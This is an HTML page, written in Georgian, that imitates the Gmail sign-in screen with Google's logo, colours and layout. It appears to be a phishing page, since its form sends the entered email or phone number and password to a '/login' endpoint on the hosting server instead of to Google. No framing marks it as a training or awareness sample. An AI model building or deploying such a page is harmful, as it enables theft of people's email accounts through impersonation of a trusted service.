<!DOCTYPE html>
<html lang="ka">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Gmail - შესვლა</title>
        <style>
            body {
                font-family: 'Roboto', 'arial', sans-serif;
                background-color: #fff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }

            .login-box {
                width: 450px;
                border: 1px solid #dadce0;
                border-radius: 8px;
                padding: 48px 40px 36px;
                text-align: center;
            }

            .logo {
                width: 75px;
                margin-bottom: 10px;
            }

            h1 {
                font-size: 24px;
                font-weight: 400;
                margin-bottom: 10px;
            }

            p {
                font-size: 16px;
                margin-bottom: 25px;
            }

            input {
                width: 100%;
                padding: 13px 15px;
                margin: 10px 0;
                display: inline-block;
                border: 1px solid #dadce0;
                border-radius: 4px;
                box-sizing: border-box;
                font-size: 16px;
            }

            input:focus {
                outline: none;
                border: 2px solid #1a73e8;
                padding: 12px 14px;
            }

            .btn-container {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-top: 30px;
            }

            .create-account {
                color: #1a73e8;
                font-weight: 500;
                text-decoration: none;
                font-size: 14px;
            }

            button {
                background-color: #1a73e8;
                color: white;
                padding: 10px 24px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
                font-weight: 500;
            }

            button:hover {
                background-color: #1b66c9;
                box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
            }

        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
            <h1>შესვლა</h1>
            <p>გამოიყენეთ თქვენი Google ანგარიში</p>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="ელ-ფოსტა ან ტელეფონი" required>
                <input type="password" name="password" placeholder="შეიყვანეთ თქვენი პაროლი" required>

                <div class="btn-container">
                    <a href="#" class="create-account">ანგარიშის შექმნა</a>
                    <button type="submit">შემდეგი</button>
                </div>
            </form>
        </div>
    </body>
</html>
